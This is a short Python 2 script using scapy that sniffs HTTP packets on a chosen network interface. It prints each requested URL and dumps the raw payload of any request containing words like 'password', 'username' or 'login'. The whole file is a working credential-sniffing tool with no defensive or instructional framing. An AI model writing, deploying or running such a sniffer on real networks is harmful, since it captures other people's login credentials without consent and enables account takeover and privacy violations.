import scapy.all as scapy
from scapy.layers import http


def getURL(packets):
    return packets[http.HTTPRequest].Host + packets[http.HTTPRequest].Path


def get_LoginInfo(packets):
    if packets.haslayer(scapy.Raw):

        load = packets[scapy.Raw].load
        keywords = ["password", "username", "user", "login", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packets(packets):

    if packets.haslayer(http.HTTPRequest):

        url = getURL(packets)
        print "Http Request : \n\n"+url

        login_info = get_LoginInfo(packets)
        if login_info:
            print "Possible Login Info : \n\n"+login_info


def sniff(interface):

    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)



def main():
    interface = raw_input("Interface Name: ")

    sniff(interface)



if __name__ == '__main__':
    main()
